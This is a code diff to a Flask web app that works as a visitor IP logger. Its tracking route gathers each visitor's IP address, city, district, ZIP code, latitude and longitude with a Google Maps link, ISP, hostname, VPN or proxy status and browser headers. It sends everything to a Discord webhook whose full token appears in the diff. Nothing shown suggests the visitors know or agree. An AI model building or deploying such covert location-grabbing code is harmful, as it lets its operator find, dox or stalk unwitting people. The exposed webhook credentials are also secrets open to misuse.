@@ -7,7 +7,7 @@ import requests
 app = Flask(__name__)
 
 # Your Discord webhook URL
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1559407288585031782/V-VTGPgCyHB5hA34mhE4RE2VeAPBJGr5GMp6Buw-tg6RzUpvBSdecdHy0oX4IXCtSKzO"
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1559400657822285867/l5kZxX5HLiSl_4d7dIUdcStl2lMOmDXhB1c-QkBLVDcuq--uhL-QoSySabvpWWjDLAMF"
 
 
 def _find_index():
@@ -60,12 +60,21 @@ def track_data():
                 ip_info = {
                     'ip': ip_data.get('query'),
                     'country': ip_data.get('country'),
+                    'countryCode': ip_data.get('countryCode'),
                     'region': ip_data.get('regionName'),
+                    'regionCode': ip_data.get('region'),
                     'city': ip_data.get('city'),
+                    'district': ip_data.get('district'),
                     'zip': ip_data.get('zip'),
+                    'lat': ip_data.get('lat'),
+                    'lon': ip_data.get('lon'),
                     'isp': ip_data.get('isp'),
                     'org': ip_data.get('org'),
                     'as': ip_data.get('as'),
+                    'reverse': ip_data.get('reverse'),
+                    'mobile': ip_data.get('mobile', False),
+                    'proxy': ip_data.get('proxy', False),
+                    'hosting': ip_data.get('hosting', False),
                     'timezone': ip_data.get('timezone')
                 }
     except Exception as e:
@@ -73,6 +82,15 @@ def track_data():
 
     data['ipInfo'] = ip_info
     data['clientIp'] = client_ip
+
+    # Extra server-side request info (headers can't be spoofed by JS the same way)
+    data['serverInfo'] = {
+        'path': request.path,
+        'userAgentHeader': request.headers.get('User-Agent', 'N/A'),
+        'acceptLanguage': request.headers.get('Accept-Language', 'N/A'),
+        'referer': request.headers.get('Referer', 'N/A'),
+        'fullUrl': request.url,
+    }
 
     # Send to Discord with boxed formatting
     send_to_discord(data)
@@ -118,12 +136,35 @@ def send_to_discord(data):
     if ip_info:
         lines.append("║ 🌐 IP INTELLIGENCE")
         if ip_info.get('ip'): lines.append(f"║    IP: {ip_info['ip']}")
-        if ip_info.get('city') and ip_info.get('country'):
-            lines.append(f"║    Location: {ip_info.get('city')}, {ip_info.get('country')}")
+        # City, Region/State, Country on one line
+        place_parts = []
+        if ip_info.get('city'): place_parts.append(ip_info['city'])
+        state = ip_info.get('region') or ip_info.get('regionCode')
+        if state: place_parts.append(state)
+        country = ip_info.get('country')
+        if country:
+            cc = ip_info.get('countryCode')
+            place_parts.append(f"{country} ({cc})" if cc else country)
+        if place_parts:
+            lines.append(f"║    Location: {', '.join(place_parts)}")
+        if ip_info.get('district'): lines.append(f"║    District: {ip_info['district']}")
+        if ip_info.get('zip'): lines.append(f"║    ZIP: {ip_info['zip']}")
+        # IP-derived coordinates + maps link
+        if ip_info.get('lat') and ip_info.get('lon'):
+            lines.append(f"║    Coords: {ip_info['lat']}, {ip_info['lon']}")
+            lines.append(f"║    https://maps.google.com/?q={ip_info['lat']},{ip_info['lon']}")
         if ip_info.get('isp'): lines.append(f"║    ISP: {ip_info['isp']}")
         if ip_info.get('org'): lines.append(f"║    Org: {ip_info['org']}")
         if ip_info.get('as'): lines.append(f"║    ASN: {ip_info['as']}")
-        if ip_info.get('zip'): lines.append(f"║    ZIP: {ip_info['zip']}")
+        if ip_info.get('reverse'): lines.append(f"║    Hostname: {ip_info['reverse']}")
+        if ip_info.get('timezone'): lines.append(f"║    TZ: {ip_info['timezone']}")
+        # Security flags (VPN/proxy/datacenter detection)
+        flags = []
+        if ip_info.get('proxy'): flags.append("🔴 PROXY/VPN")
+        if ip_info.get('hosting'): flags.append("🟠 DATACENTER")
+        if ip_info.get('mobile'): flags.append("🟢 MOBILE NETWORK")
+        if flags:
+            lines.append(f"║    Flags: {' | '.join(flags)}")
     lines.append("║")
 
     # DEVICE & BROWSER
@@ -214,8 +255,15 @@ def send_to_discord(data):
     if data.get('timestamp'):
         ts = data['timestamp'][:19].replace('T', ' ')
         lines.append(f"║    Time: {ts}")
+    srv = data.get('serverInfo', {})
+    if srv.get('path') and srv['path'] != '/':
+        lines.append(f"║    Visited: {srv['path']}")
+    if srv.get('acceptLanguage') and srv['acceptLanguage'] != 'N/A':
+        lines.append(f"║    Accept-Lang: {srv['acceptLanguage'][:50]}")
     if data.get('referrer') and data['referrer'] != 'Direct':
         lines.append(f"║    Referrer: {data['referrer'][:50]}...")
+    elif srv.get('referer') and srv['referer'] != 'N/A':
+        lines.append(f"║    Referrer: {srv['referer'][:50]}...")
     lines.append("║")
 
     # BOTTOM BORDER
